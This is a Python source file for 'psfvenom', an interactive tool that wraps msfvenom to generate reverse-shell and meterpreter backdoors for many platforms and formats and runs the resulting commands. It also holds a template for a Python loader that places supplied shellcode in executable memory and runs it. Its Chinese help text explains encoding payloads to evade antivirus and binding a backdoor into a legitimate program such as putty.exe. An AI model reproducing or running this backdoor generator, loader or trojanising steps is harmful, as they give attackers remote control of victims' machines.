#author:九世
#time:2019/3/4

import os
colour=__import__('colour',fromlist=True)
jiances=__import__('jiance',fromlist=True)
green=getattr(colour,'green')
red=getattr(colour,'red')
yellow=getattr(colour,'yellow')

numbers=getattr(jiances,'numbers')
ips=getattr(jiances,'ips')
ports=getattr(jiances,'ports')
type_ofs=getattr(jiances,'type_ofs')
names=getattr(jiances,'names')

class psfvenom:
    def banner(self):
        banner='''
                      /\                                 
             ||  ;                               
-_-_   _-_, =||= \\/\  _-_  \\/\\  /'\\ \\/\\/\\ 
|| \\ ||_.   ||  || | || \\ || || || || || || || 
|| ||  ~ ||  ||  || | ||/   || || || || || || || 
||-'  ,-_-   \\, \\/  \\,/  \\ \\ \\,/  \\ \\ \\ 
|/                                               
'                                                
        '''
        print(yellow(banner))
    def default(self):
        sc=['1.Generate windows malicious load','2.Generate Linux malicious payload','3.Generate Mac malicious payload','4.Generate PHP malicious payload','5.Generate ASP malicious payload','6.Generate JSP malicious payload','7.Generate WAR malicious payload','8.Generate Python malicious payload','9.Generate Bash malicious payload','10.Generate Perl malicious payload','11.Generate Jar malicious payload','12.Generate python executable shellcode','13.Msfvenom help']
        sc_s={'1':self.windows,'2':self.linux,'3':self.mac,'4':self.php,'5':self.asp,'6':self.jsp,'7':self.war,'8':self.python,'9':self.bash,'10':self.perl,'11':self.jar,'12':self.ps,'13':self.help}
        for s in sc:
            print(s)

        user=input('select>')
        if user in sc_s:
            sc_s.get(user)()

    def windows(self):
        number=''
        lhost=''
        lport=''
        type_of=''
        name=''

        user_payload=input('Number of digits (x86/x64/x86_64):')
        number_s=numbers(user_payload)
        if number_s!='':
            number+=number_s
            print(yellow('[+]'),'number=>{}'.format(number))

        if number!='':
            user_ip=input('Lhost:')
            ip_s=ips(user_ip)
            if ip_s!='':
                lhost+=ip_s
                print(yellow('[+]'), 'LHOST=>{}'.format(lhost))


        if lhost!='':
            user_port=input('Lport:')
            port_s=ports(user_port)
            if ports!='':
                lport+=port_s
                print(yellow('[+]'), 'LPORT=>{}'.format(lport))


        if lport!='':
            user_typeof=input('Type of(dll/exe/txt/c/py):')
            type_of_s=type_ofs(user_typeof)
            if type_of_s !='':
                type_of+=type_of_s
                print(yellow('[+]'), 'TYPE=>{}'.format(type_of))


        if type_of!='':
            user_name=input('Name:')
            name_s=names(user_name)
            if name_s!='':
                name+=name_s
                print(yellow('[+]'), 'NAME=>{}'.format(name))

        if  number!='' and lhost!='' and lport!='' and type_of!='' and name!='':
            command='msfvenom -p windows/{}/meterpreter/reverse_tcp LHOST={} LPORT={} -f {} > file/{}.{}'.format(number,lhost,lport,type_of,name,type_of)
            print(yellow('[+]'),'command:{}'.format(command))
            os.system(command)

    def linux(self):
        number = ''
        lhost = ''
        lport = ''
        type_of = ''
        name = ''

        user_payload = input('Number of digits (x86/x64/x86_64):')
        number_s = numbers(user_payload)
        if number_s!='':
            number += number_s
            print(yellow('[+]'), 'number=>{}'.format(number))

        if number != '':
            user_ip = input('Lhost:')
            ip_s = ips(user_ip)
            if ip_s != '':
                lhost += ip_s
                print(yellow('[+]'), 'LHOST=>{}'.format(lhost))

        if lhost != '':
            user_port = input('Lport:')
            port_s = ports(user_port)
            if ports != '':
                lport += port_s
                print(yellow('[+]'), 'LPORT=>{}'.format(lport))

        if lport != '':
            user_typeof = input('Type of(dll/exe/txt/c/py/elf):')
            type_of_s = type_ofs(user_typeof)
            if type_of_s != '':
                type_of += type_of_s
                print(yellow('[+]'), 'TYPE=>{}'.format(type_of))

        if type_of != '':
            user_name = input('Name:')
            name_s = names(user_name)
            if name_s!='':
                name += name_s
                print(yellow('[+]'), 'NAME=>{}'.format(name))

        if number != '' and lhost != '' and lport != '' and type_of != '' and name != '':
            command='msfvenom -p linux/{}/meterpreter/reverse_tcp LHOST={} LPORT={} -f {} > file/{}.{}'.format(number,lhost,lport,type_of,name,type_of)
            print(yellow('[+]'),'command:{}'.format(command))
            os.system(command)

    def mac(self):
            number = ''
            lhost = ''
            lport = ''
            type_of = ''
            name = ''

            user_payload = input('Number of digits (x86/x64/x86_64):')
            number_s = numbers(user_payload)
            if number_s!='':
                number += number_s
                print(yellow('[+]'), 'number=>{}'.format(number))

            if number != '':
                user_ip = input('Lhost:')
                ip_s = ips(user_ip)
                if ip_s != '':
                    lhost += ip_s
                    print(yellow('[+]'), 'LHOST=>{}'.format(lhost))

            if lhost != '':
                user_port = input('Lport:')
                port_s = ports(user_port)
                if ports != '':
                    lport += port_s
                    print(yellow('[+]'), 'LPORT=>{}'.format(lport))

            if lport != '':
                user_typeof = input('Type of(dll/exe/txt/c/py/elf):')
                type_of_s = type_ofs(user_typeof)
                if type_of_s != '':
                    type_of += type_of_s
                    print(yellow('[+]'), 'TYPE=>{}'.format(type_of))

            if type_of != '':
                user_name = input('Name:')
                name_s = names(user_name)
                if name_s!='':
                    name += name_s
                    print(yellow('[+]'), 'NAME=>{}'.format(name))

            if number != '' and lhost != '' and lport != '' and type_of != '' and name != '':
                command='msfvenom -p osx/{}/shell_reverse_tcp LHOST={} LPORT={} -f {} > file/{}.{}'.format(number,lhost,lport,type_of,name,type_of)
                print(yellow('[+]'),'command:{}'.format(command))
                os.system(command)

    def php(self):
        lhost = ''
        lport = ''
        name = ''

        user_ip = input('Lhost:')
        ip_s = ips(user_ip)
        if ip_s != '':
            lhost+=ip_s
            print(yellow('[+]'), 'LHOST=>{}'.format(lhost))

        if lhost != '':
            user_port = input('Lport:')
            port_s = ports(user_port)
            if ports != '':
                lport += port_s
                print(yellow('[+]'), 'LPORT=>{}'.format(lport))

        if lport!='':
            user_name = input('Name:')
            name_s = names(user_name)
            if name_s!='':
                name += name_s
                print(yellow('[+]'), 'NAME=>{}'.format(name))

        if  lhost!= '' and lport!= '' and name!= '':
            command='msfvenom -p php/meterpreter_reverse_tcp LHOST={} LPORT={} -f raw > file/{}.php'.format(lhost,lport,name)
            print(yellow('[+]'), 'command:{}'.format(command))
            os.system(command)

    def asp(self):
        lhost = ''
        lport = ''
        name = ''

        user_ip = input('Lhost:')
        ip_s = ips(user_ip)
        if ip_s != '':
            lhost+=ip_s
            print(yellow('[+]'), 'LHOST=>{}'.format(lhost))

        if lhost != '':
            user_port = input('Lport:')
            port_s = ports(user_port)
            if ports != '':
                lport += port_s
                print(yellow('[+]'), 'LPORT=>{}'.format(lport))

        if lport!='':
            user_name = input('Name:')
            name_s = names(user_name)
            if name_s!='':
                name += name_s
                print(yellow('[+]'), 'NAME=>{}'.format(name))

        if  lhost!= '' and lport!= '' and name!= '':
            command='msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f asp > file/{}.asp'.format(lhost,lport,name)
            print(yellow('[+]'), 'command:{}'.format(command))
            os.system(command)

    def jsp(self):
        lhost = ''
        lport = ''
        name = ''

        user_ip = input('Lhost:')
        ip_s = ips(user_ip)
        if ip_s != '':
            lhost+=ip_s
            print(yellow('[+]'), 'LHOST=>{}'.format(lhost))

        if lhost != '':
            user_port = input('Lport:')
            port_s = ports(user_port)
            if ports != '':
                lport += port_s
                print(yellow('[+]'), 'LPORT=>{}'.format(lport))

        if lport!='':
            user_name = input('Name:')
            name_s = names(user_name)
            if name_s!='':
                name += name_s
                print(yellow('[+]'), 'NAME=>{}'.format(name))

        if  lhost!= '' and lport!= '' and name!= '':
            command='msfvenom -p java/jsp_shell_reverse_tcp LHOST={} LPORT={} -f raw > file/{}.jsp'.format(lhost,lport,name)
            print(yellow('[+]'), 'command:{}'.format(command))
            os.system(command)

    def war(self):
        lhost = ''
        lport = ''
        name = ''

        user_ip = input('Lhost:')
        ip_s = ips(user_ip)
        if ip_s != '':
            lhost+=ip_s
            print(yellow('[+]'), 'LHOST=>{}'.format(lhost))

        if lhost != '':
            user_port = input('Lport:')
            port_s = ports(user_port)
            if ports != '':
                lport += port_s
                print(yellow('[+]'), 'LPORT=>{}'.format(lport))

        if lport!='':
            user_name = input('Name:')
            name_s = names(user_name)
            if name_s!='':
                name += name_s
                print(yellow('[+]'), 'NAME=>{}'.format(name))

        if  lhost!= '' and lport!= '' and name!= '':
            command='msfvenom -p java/jsp_shell_reverse_tcp LHOST={} LPORT={} -f war > file/{}.war'.format(lhost,lport,name)
            print(yellow('[+]'), 'command:{}'.format(command))
            os.system(command)

    def python(self):
        lhost = ''
        lport = ''
        name = ''

        user_ip = input('Lhost:')
        ip_s = ips(user_ip)
        if ip_s != '':
            lhost+=ip_s
            print(yellow('[+]'), 'LHOST=>{}'.format(lhost))

        if lhost != '':
            user_port = input('Lport:')
            port_s = ports(user_port)
            if ports != '':
                lport += port_s
                print(yellow('[+]'), 'LPORT=>{}'.format(lport))

        if lport!='':
            user_name = input('Name:')
            name_s = names(user_name)
            if name_s!='':
                name += name_s
                print(yellow('[+]'), 'NAME=>{}'.format(name))

        if  lhost!= '' and lport!= '' and name!= '':
            command='msfvenom -p python/meterpreter/reverser_tcp LHOST={} LPORT={} -f raw > file/{}.py'.format(lhost,lport,name)
            print(yellow('[+]'), 'command:{}'.format(command))
            os.system(command)

    def bash(self):
        lhost = ''
        lport = ''
        name = ''

        user_ip = input('Lhost:')
        ip_s = ips(user_ip)
        if ip_s != '':
            lhost+=ip_s
            print(yellow('[+]'), 'LHOST=>{}'.format(lhost))

        if lhost != '':
            user_port = input('Lport:')
            port_s = ports(user_port)
            if ports != '':
                lport += port_s
                print(yellow('[+]'), 'LPORT=>{}'.format(lport))

        if lport!='':
            user_name = input('Name:')
            name_s = names(user_name)
            if name_s!='':
                name += name_s
                print(yellow('[+]'), 'NAME=>{}'.format(name))

        if  lhost!= '' and lport!= '' and name!= '':
            command='msfvenom -p cmd/unix/reverse_bash LHOST={} LPORT={} -f raw > file/{}.sh'.format(lhost,lport,name)
            print(yellow('[+]'), 'command:{}'.format(command))
            os.system(command)

    def perl(self):
        lhost = ''
        lport = ''
        name = ''

        user_ip = input('Lhost:')
        ip_s = ips(user_ip)
        if ip_s != '':
            lhost+=ip_s
            print(yellow('[+]'), 'LHOST=>{}'.format(lhost))

        if lhost != '':
            user_port = input('Lport:')
            port_s = ports(user_port)
            if ports != '':
                lport += port_s
                print(yellow('[+]'), 'LPORT=>{}'.format(lport))

        if lport!='':
            user_name = input('Name:')
            name_s = names(user_name)
            if name_s!='':
                name += name_s
                print(yellow('[+]'), 'NAME=>{}'.format(name))

        if  lhost!= '' and lport!= '' and name!= '':
            command='msfvenom -p cmd/unix/reverse_perl LHOST={} LPORT={} -f raw > file/{}.pl'.format(lhost,lport,name)
            print(yellow('[+]'), 'command:{}'.format(command))
            os.system(command)

    def jar(self):
        lhost = ''
        lport = ''
        name = ''

        user_ip = input('Lhost:')
        ip_s = ips(user_ip)
        if ip_s != '':
            lhost+=ip_s
            print(yellow('[+]'), 'LHOST=>{}'.format(lhost))

        if lhost != '':
            user_port = input('Lport:')
            port_s = ports(user_port)
            if ports != '':
                lport += port_s
                print(yellow('[+]'), 'LPORT=>{}'.format(lport))

        if lport!='':
            user_name = input('Name:')
            name_s = names(user_name)
            if name_s!='':
                name += name_s
                print(yellow('[+]'), 'NAME=>{}'.format(name))

        if  lhost!= '' and lport!= '' and name!= '':
            command='msfvenom --payload="java/meterpreter/reverse_tcp" LHOST={} LPORT={} -t jar > file/{}.jar'.format(lhost,lport,name)
            print(yellow('[+]'), 'command:{}'.format(command))
            os.system(command)

    def ps(self):
        shellcode=''
        name=''
        user_shellcode=input('shellcode:')
        if user_shellcode!='':
            shellcode+=user_shellcode

        if shellcode!='':
            user_name = input('Name:')
            name_s = names(user_name)
            if name_s != '':
                name += name_s
                print(yellow('[+]'), 'NAME=>{}'.format(name))

        payload='''
import ctypes
import sys
import chardet
from ctypes import *
import binascii

buf =  b"{}"

#这两个微软官方说明是可读可写可执行，PAGE_EXECUTE_READWRITE和VIRTUAL_MEM
PAGE_EXECUTE_READWRITE = 0x00000040 #参数设定
VIRTUAL_MEM = ( 0x1000 | 0x2000 ) #参数设定
buf_arr = bytearray (buf) #shellcode变为一个新的字节数组
buf_size = len(buf_arr) #计算shellcode的大小
kernel32 = ctypes.cdll.LoadLibrary("kernel32.dll") #调用kernel32.dll
kernel32.VirtualAlloc.restype = ctypes.c_uint64 #返回类型为c_uint64
sc_ptr = kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(buf_size), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE) #设置
buf_ptr = (ctypes.c_char * buf_size).from_buffer(buf_arr) #将shellcode指向指针
#print(sc_ptr)
#print(buf_ptr)
kernel32.RtlMoveMemory(ctypes.c_uint64(sc_ptr),buf_ptr,ctypes.c_int(buf_size)) #调用dll，指向shellcode

handle = kernel32.CreateThread(ctypes.c_int(0),
ctypes.c_int(0),
ctypes.c_uint64(sc_ptr),
ctypes.c_int(0),
ctypes.c_int(0),
ctypes.pointer(ctypes.c_int(0)))
kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))

        '''.format(shellcode)
        print(yellow('[+]'),'code:{}'.format(payload))
        print(payload,file=open('file/{}.py'.format(name),'a',encoding='utf-8'))

    def help(self):
        helps='''
        参数说明：



 –p (- -payload-options)

添加载荷payload。

载荷这个东西比较多，这个软件就是根据对应的载荷payload生成对应平台下的后门，所以只有选对payload，再填写正确自己的IP，PORT就可以生成对应语言，对应平台的后门了！！！

(- -payload-options 列出payload选项)



–l

查看所有payload encoder nops。



 –f （- -help-formats）

输出文件格式。

(- -help-formats 列出所有文件格式)

Executable formats:

asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war



Transform formats:



bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript



 –e

编码免杀。



 –a (- -platform  – -help-platforms)

选择架构平台

x86 | x64 | x86_64

Platforms:

windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe



–o

文件输出。



–s

生成payload的最大长度，就是文件大小。



–b

避免使用的字符 例如：不使用 ‘\0f’。



 –i

编码次数。



–c

添加自己的shellcode。



–x | -k

捆绑。例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面。







实例：



实例1(简单生成)：

msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.0.102 LPORT=11111 -f exe -o /Users/jiangzhehao/Downloads/1.exe



-p 指定payload，payload后跟该payload的option；



-o 指定payload的保存路径，包含文件名



实例2（替换指定代码）：

msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.0.102 LPORT=11111 -b '\x00' -f exe -o /Users/jiangzhehao/Downloads/1.exe



-b ，--bad-char  替换代码中会出现中断的字符，如 '\x00\xff'



实例3（指定编码器）：

msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.0.102 LPORT=11111 -b '\x00' -e x86/shikata_ga_nai -f exe -o /Users/jiangzhehao/Downloads/1.exe



-e 指定特定的编码器



实例4（绑定后门到其他可执行程序上）：

msfvenom -p windows/meterpreter/reverse_http LHOST=172.16.0.102 LPORT=3333 -x /Users/jiangzhehao/Downloads/putty.exe -k -f exe -o /Users/jiangzhehao/Downloads/puuty_bind.exe



-p windows/meterpreter/reverse_http LHOST=172.16.0.102 LPORT=3333  指定payload和payload的参数

-x /Users/jiangzhehao/Downloads/putty.exe执行要绑定的软件

-k从原始的注文件中分离出来，单独创建一个进程

-f exe指定输出格式

-o /Users/jiangzhehao/Downloads/puuty_bind.exe指定输出路径
        '''
        print(yellow('[+]'),'help')
        print(helps)

if __name__ == '__main__':
    p=psfvenom()
    p.banner()
    p.default()